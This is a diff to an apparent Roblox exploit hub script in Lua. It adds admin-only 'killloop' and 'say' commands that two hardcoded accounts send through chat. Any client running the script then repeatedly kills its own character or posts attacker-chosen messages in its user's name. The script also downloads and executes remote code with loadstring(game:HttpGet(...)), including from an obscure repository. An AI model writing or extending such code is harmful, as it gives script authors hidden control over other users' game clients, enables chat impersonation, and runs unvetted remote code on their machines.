@@ -78,6 +78,7 @@ local localPlayer = Players.LocalPlayer
 local IS_ADMIN = (localPlayer.Name == "Bolsonaro_Jair7" or localPlayer.Name == "vl2445")
 local SpinPlayers = {}
 local CaixaPlayers = {}
+local KillLoopPlayers = {}
 
 -- [[ CARREGAMENTO DA WINDUI ]]
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
@@ -194,6 +195,49 @@ VerifyTab:Button({
         AdminTab:Button({Title = d[1], Callback = function() EnviarCmd(d[2], selectedPlayerAdmin) end})
     end
 end
+
+AdminTab:Section({ Title = "Kill Loop" })
+
+    -- Kill Loop
+    AdminTab:Button({
+        Title = "Kill Loop",
+        Callback = function()
+            if selectedPlayerAdmin then
+                EnviarCmd("killloop", selectedPlayerAdmin)
+            end
+        end
+    })
+
+    -- Unkill Loop
+    AdminTab:Button({
+        Title = "Unkill Loop",
+        Callback = function()
+            if selectedPlayerAdmin then
+                EnviarCmd("unkillloop", selectedPlayerAdmin)
+            end
+        end
+    })
+
+    -- Sistema de Chat Forçado
+    AdminTab:Section({ Title = "Emviar Mensagem" })
+    
+    local messageToSend = ""
+    AdminTab:Textbox({
+        Title = "Mensagem",
+        Callback = function(text)
+            messageToSend = text
+        end
+    })
+
+    AdminTab:Button({
+        Title = "Forçar Mensagem",
+        Callback = function()
+            if selectedPlayerAdmin and messageToSend ~= "" then
+                EnviarCmd("say", selectedPlayerAdmin .. " " .. messageToSend)
+            end
+        end
+    })
+
 
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/mariaelenaquerino6-bit/Chad-hub/refs/heads/main/main.luau__2_%20(1).txt"))()
 
@@ -355,6 +399,36 @@ local function handleCommand(sender, text)
     end
 end
 
+   elseif cmd == "killloop" then
+        KillLoopPlayers[LPlayer.Name] = true
+        WindUI:Notify({
+            Title = "Kill Loop",
+            Content = "Kill Loop ativado!",
+            Image = "skull"
+        })
+
+    elseif cmd == "unkillloop" then
+        KillLoopPlayers[LPlayer.Name] = nil
+        WindUI:Notify({
+            Title = "Kill Loop",
+            Content = "Kill Loop desativado!",
+            Image = "check"
+        })
+
+    elseif cmd == "say" then
+        -- Extrair a mensagem
+        local _, msgStart = text:find(";" .. cmd .. " " .. target .. " ")
+        if msgStart then
+            local message = text:sub(msgStart + 1)
+            local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral") 
+                or TextChatService.TextChannels:GetChildren()[1]
+            if chatChannel then
+                chatChannel:SendAsync(message)
+            end
+        end
+
+    
+
 -- ===================== CHAT NEW =====================
 
 pcall(function()
@@ -386,6 +460,17 @@ RunService.RenderStepped:Connect(function(dt)
         local hrp = LPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart")
         if hrp then
             hrp.CFrame *= CFrame.Angles(0, math.rad(1100 * dt), 0)
+        end
+    end
+end)
+
+-- Loop para kill loop
+RunService.Heartbeat:Connect(function()
+    if KillLoopPlayers[localPlayer.Name] then
+        local char = localPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        if hum then
+            hum.Health = 0
         end
     end
 end)
@@ -6053,6 +6138,7 @@ task.spawn(function()
         RE:WaitForChild("1RPNam1eColo1r", 9e9):FireServer("PickingRPBioColor", Color3.fromRGB(255, 19, 3))
     end)
 end)
+
 
 
 
